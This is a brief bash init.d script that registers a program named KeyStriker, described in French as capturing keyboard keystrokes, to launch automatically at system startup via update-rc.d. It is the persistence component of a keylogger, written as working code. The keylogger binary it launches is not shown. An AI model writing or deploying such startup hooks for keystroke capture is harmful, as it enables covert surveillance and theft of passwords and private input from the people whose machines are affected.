#!/bin/bash

#if [ true != "$INIT_D_SCRIPT_SOURCED" ] ; then
    #set "$0" "$@"; INIT_D_SCRIPT_SOURCED=true . /lib/init/init-d-script
#fi
### BEGIN INIT INFO
# Provides:          KeyStriker
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: hophophop
# Description:       Récupère les frappes du clavier
### END INIT INFO

DESC="Programme:"
DAEMON=/usr/bin/KeyStriker

update-rc.d daemon_launcher.sh start 30 2 3 4 5 . stop 10 0 1 6 .

echo -e "\nKeyStriker added to startup routine.\n"

